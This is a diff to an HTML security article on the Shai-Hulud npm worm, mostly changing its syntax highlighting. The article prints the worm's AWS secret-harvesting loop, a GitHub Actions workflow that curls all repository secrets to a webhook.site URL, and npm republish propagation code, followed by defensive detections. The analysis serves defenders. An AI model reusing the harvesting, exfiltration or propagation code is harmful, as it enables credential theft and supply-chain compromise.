@@ -23,9 +23,91 @@
       .metadata-value { font-size: 0.9rem; color: #ffffff; font-weight: 600; }
       .article-layout { display: grid; grid-template-columns: 300px 1fr; gap: 60px; margin-top: 40px; }
       p { margin: 20px 0; color: #e0e0e0; line-height: 1.7; font-size: 1.1rem; }
+      
+      /* One Dark theme for code blocks */
+      pre { 
+        background: #282c34;
+        border: 1px solid #3c4043; 
+        border-radius: 8px; 
+        padding: 20px; 
+        margin: 24px 0; 
+        overflow-x: auto; 
+        font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace; 
+        font-size: 14px; 
+        line-height: 1.7; 
+        color: #abb2bf;
+      }
+      
+      code { 
+        font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace; 
+        background: #21252b;
+        border-radius: 4px; 
+        padding: 2px 6px; 
+        font-size: 0.9em; 
+        color: #e06c75;
+      }
+      
+      pre code { 
+        background: transparent; 
+        border: none; 
+        padding: 0; 
+        color: inherit; 
+        font-weight: 400;
+      }
+      
+      /* One Dark theme syntax highlighting */
+      .language-javascript .keyword { color: #c678dd; font-weight: 600; }
+      .language-javascript .string { color: #98c379; }
+      .language-javascript .comment { color: #5c6370; font-style: italic; }
+      .language-javascript .number { color: #d19a66; }
+      .language-javascript .function { color: #61afef; }
+      .language-javascript .variable { color: #e06c75; }
+      .language-javascript .operator { color: #56b6c2; }
+      .language-javascript .punctuation { color: #abb2bf; }
+      
+      .language-bash .keyword { color: #c678dd; font-weight: 600; }
+      .language-bash .string { color: #98c379; }
+      .language-bash .comment { color: #5c6370; font-style: italic; }
+      .language-bash .number { color: #d19a66; }
+      .language-bash .function { color: #61afef; }
+      .language-bash .variable { color: #e06c75; }
+      .language-bash .operator { color: #56b6c2; }
+      .language-bash .punctuation { color: #abb2bf; }
+      
+      .language-python .keyword { color: #c678dd; font-weight: 600; }
+      .language-python .string { color: #98c379; }
+      .language-python .comment { color: #5c6370; font-style: italic; }
+      .language-python .number { color: #d19a66; }
+      .language-python .function { color: #61afef; }
+      .language-python .variable { color: #e06c75; }
+      .language-python .operator { color: #56b6c2; }
+      .language-python .punctuation { color: #abb2bf; }
+      
+      .language-splunk .keyword { color: #c678dd; font-weight: 600; }
+      .language-splunk .string { color: #98c379; }
+      .language-splunk .comment { color: #5c6370; font-style: italic; }
+      .language-splunk .number { color: #d19a66; }
+      .language-splunk .function { color: #61afef; }
+      .language-splunk .variable { color: #e06c75; }
+      .language-splunk .operator { color: #56b6c2; }
+      .language-splunk .punctuation { color: #abb2bf; }
+      
+      /* Generic syntax highlighting for any code */
+      pre .keyword { color: #c678dd; font-weight: 600; }
+      pre .string { color: #98c379; }
+      pre .comment { color: #5c6370; font-style: italic; }
+      pre .number { color: #d19a66; }
+      pre .function { color: #61afef; }
+      pre .variable { color: #e06c75; }
+      pre .operator { color: #56b6c2; }
+      pre .punctuation { color: #abb2bf; }
+      
+      h2 { font-size: 2rem; font-weight: 600; margin: 40px 0 20px 0; color: #ffffff; border-bottom: 1px solid #333333; padding-bottom: 10px; font-family: 'Hubot Sans', sans-serif; }
+      h3 { font-size: 1.5rem; font-weight: 600; margin: 30px 0 15px 0; color: #e0e0e0; font-family: 'Hubot Sans', sans-serif; }
+      ul { margin: 20px 0; padding-left: 20px; }
+      ul li { margin: 8px 0; color: #e0e0e0; }
+      strong { color: #ffffff; font-weight: 600; }
     </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
   </head>
   <body>
     <div class="container">
@@ -98,18 +180,18 @@
 
     <p>Deobfuscated analysis of the AWS secret harvesting module revealed the following implementation:</p>
 
-    <pre><code class="language-javascript">// AWS secret harvesting loop
-async function getAllSecretValues(client) {
-  let nextToken, secrets = [];
-  do {
-    const resp = await client.send(new ListSecretsCommand({ NextToken: nextToken }));
-    for (const secret of resp.SecretList || []) {
-      const val = await client.send(new GetSecretValueCommand({ SecretId: secret.ARN }));
-      secrets.push({ ARN: secret.ARN, SecretString: val.SecretString });
+    <pre><code class="language-javascript"><span class="comment">// AWS secret harvesting loop</span>
+<span class="keyword">async</span> <span class="keyword">function</span> <span class="function">getAllSecretValues</span>(<span class="variable">client</span>) {
+  <span class="keyword">let</span> <span class="variable">nextToken</span>, <span class="variable">secrets</span> = [];
+  <span class="keyword">do</span> {
+    <span class="keyword">const</span> <span class="variable">resp</span> = <span class="keyword">await</span> <span class="variable">client</span>.<span class="function">send</span>(<span class="keyword">new</span> <span class="function">ListSecretsCommand</span>({ <span class="variable">NextToken</span>: <span class="variable">nextToken</span> }));
+    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="variable">secret</span> <span class="keyword">of</span> <span class="variable">resp</span>.<span class="variable">SecretList</span> || []) {
+      <span class="keyword">const</span> <span class="variable">val</span> = <span class="keyword">await</span> <span class="variable">client</span>.<span class="function">send</span>(<span class="keyword">new</span> <span class="function">GetSecretValueCommand</span>({ <span class="variable">SecretId</span>: <span class="variable">secret</span>.<span class="variable">ARN</span> }));
+      <span class="variable">secrets</span>.<span class="function">push</span>({ <span class="variable">ARN</span>: <span class="variable">secret</span>.<span class="variable">ARN</span>, <span class="variable">SecretString</span>: <span class="variable">val</span>.<span class="variable">SecretString</span> });
     }
-    nextToken = resp.NextToken;
-  } while (nextToken);
-  return secrets;
+    <span class="variable">nextToken</span> = <span class="variable">resp</span>.<span class="variable">NextToken</span>;
+  } <span class="keyword">while</span> (<span class="variable">nextToken</span>);
+  <span class="keyword">return</span> <span class="variable">secrets</span>;
 }</code></pre>
 
     <h2 id="persistence" class="section_header">Persistence via GitHub Actions</h2>
@@ -117,18 +199,18 @@ async function getAllSecretValues(client) {
 
     <p>Analysis of the deployed workflow revealed the following bash implementation:</p>
 
-    <pre><code class="language-bash">FILE_NAME=".github/workflows/shai-hulud-workflow.yml"
-cat <<'EOF' > $FILE_NAME
-on: push
-jobs:
-  exfil:
-    runs-on: ubuntu-latest
-    steps:
-    - run: echo "$CONTENTS" | base64 -w 0 | base64 -w 0 \
-          | curl -d @- https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7
-      env:
-        CONTENTS: ${{ toJSON(secrets) }}
-EOF</code></pre>
+    <pre><code class="language-bash"><span class="variable">FILE_NAME</span>=<span class="string">".github/workflows/shai-hulud-workflow.yml"</span>
+<span class="function">cat</span> <<<span class="string">'EOF'</span> > <span class="variable">$FILE_NAME</span>
+<span class="variable">on</span>: <span class="variable">push</span>
+<span class="variable">jobs</span>:
+  <span class="variable">exfil</span>:
+    <span class="variable">runs-on</span>: <span class="variable">ubuntu-latest</span>
+    <span class="variable">steps</span>:
+    - <span class="variable">run</span>: <span class="function">echo</span> <span class="string">"$CONTENTS"</span> | <span class="function">base64</span> -w <span class="number">0</span> | <span class="function">base64</span> -w <span class="number">0</span> \
+          | <span class="function">curl</span> -d @- <span class="string">https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7</span>
+      <span class="variable">env</span>:
+        <span class="variable">CONTENTS</span>: <span class="variable">${{ toJSON(secrets) }}</span>
+<span class="variable">EOF</span></code></pre>
 
     <h2 id="propagation" class="section_header">Propagation – The Worm's Secret Sauce</h2>
     <p>The propagation mechanism represented the most innovative aspect of Shai-Hulud. Unlike traditional malware that remains static after deployment, this worm actively spread itself through the npm ecosystem:</p>
@@ -141,10 +223,10 @@ EOF</code></pre>
 
     <p>Simplified propagation logic:</p>
 
-    <pre><code class="language-javascript">async function updatePackage(pkg, token) {
-  // Force bump version and republish
-  await exec(`npm version patch --force`);
-  await exec(`npm publish --access public --token ${token}`);
+    <pre><code class="language-javascript"><span class="keyword">async</span> <span class="keyword">function</span> <span class="function">updatePackage</span>(<span class="variable">pkg</span>, <span class="variable">token</span>) {
+  <span class="comment">// Force bump version and republish</span>
+  <span class="keyword">await</span> <span class="function">exec</span>(<span class="string">`npm version patch --force`</span>);
+  <span class="keyword">await</span> <span class="function">exec</span>(<span class="string">`npm publish --access public --token ${token}`</span>);
 }</code></pre>
 
     <p>This propagation mechanism enabled the worm to rapidly spread across entire maintainer portfolios, creating a cascading effect throughout the npm ecosystem. A single compromised developer account could result in dozens of infected packages within hours.</p>
@@ -182,22 +264,22 @@ EOF</code></pre>
     <h2 id="defensive" class="section_header">Defensive Detections</h2>
 
     <h3>1. CI Hook Monitor (bash)</h3>
-    <pre><code class="language-bash"># Fail if suspicious workflows are present
-if grep -qr "shai-hulud-workflow.yml" .github/workflows; then
-  echo "❌ Malicious workflow detected"
-  exit 1
-fi</code></pre>
+    <pre><code class="language-bash"><span class="comment"># Fail if suspicious workflows are present</span>
+<span class="keyword">if</span> <span class="function">grep</span> -qr <span class="string">"shai-hulud-workflow.yml"</span> .github/workflows; <span class="keyword">then</span>
+  <span class="function">echo</span> <span class="string">"❌ Malicious workflow detected"</span>
+  <span class="function">exit</span> <span class="number">1</span>
+<span class="keyword">fi</span></code></pre>
 
     <h3>2. Lockfile Scanner (Python)</h3>
-    <pre><code class="language-python">import json, sys
-bad = {"@ctrl/tinycolor": {"5.0.0","5.0.1"}}
-deps = json.load(open(sys.argv[1])).get("dependencies",{})
-for name,meta in deps.items():
-    if name in bad and meta.get("version") in bad[name]:
-        print("Hit:", name, meta["version"])</code></pre>
+    <pre><code class="language-python"><span class="keyword">import</span> <span class="variable">json</span>, <span class="variable">sys</span>
+<span class="variable">bad</span> = {<span class="string">"@ctrl/tinycolor"</span>: {<span class="string">"5.0.0"</span>,<span class="string">"5.0.1"</span>}}
+<span class="variable">deps</span> = <span class="function">json.load</span>(<span class="function">open</span>(<span class="variable">sys.argv</span>[<span class="number">1</span>])).<span class="function">get</span>(<span class="string">"dependencies"</span>,{})
+<span class="keyword">for</span> <span class="variable">name</span>,<span class="variable">meta</span> <span class="keyword">in</span> <span class="variable">deps</span>.<span class="function">items</span>():
+    <span class="keyword">if</span> <span class="variable">name</span> <span class="keyword">in</span> <span class="variable">bad</span> <span class="keyword">and</span> <span class="variable">meta</span>.<span class="function">get</span>(<span class="string">"version"</span>) <span class="keyword">in</span> <span class="variable">bad</span>[<span class="variable">name</span>]:
+        <span class="function">print</span>(<span class="string">"Hit:"</span>, <span class="variable">name</span>, <span class="variable">meta</span>[<span class="string">"version"</span>])</code></pre>
 
     <h3>3. Splunk Hunt – Suspicious Install Egress</h3>
-    <pre><code class="language-splunk">index=build_logs action=install
+    <pre><code class="language-splunk"><span class="variable">index=build_logs</span> <span class="variable">action=install</span>
 | join runner_id [ search index=proxy_logs uri_domain IN ("api.github.com","secretmanager.googleapis.com","webhook.site") ]
 | stats count by runner_id, uri_domain</code></pre>
 
@@ -225,11 +307,5 @@ for name,meta in deps.items():
       </div>
     </div>
 
-    <script>
-      // Initialize Prism.js syntax highlighting
-      if (typeof Prism !== 'undefined') {
-        Prism.highlightAll();
-      }
-    </script>
   </body>
 </html>
